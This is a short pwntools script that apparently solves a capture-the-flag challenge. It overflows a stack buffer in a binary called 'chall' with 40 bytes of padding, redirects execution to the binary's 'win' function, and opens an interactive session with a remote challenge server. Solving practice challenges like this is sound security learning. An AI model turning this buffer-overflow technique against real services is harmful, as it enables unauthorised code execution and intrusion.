from pwn import *

elf = ELF("./chall")

#io = process("./chall")

io = remote("0.cloud.chals.io", 32881)

io.sendline(b"A"*40 + p64(elf.sym.win + 8))

io.interactive()
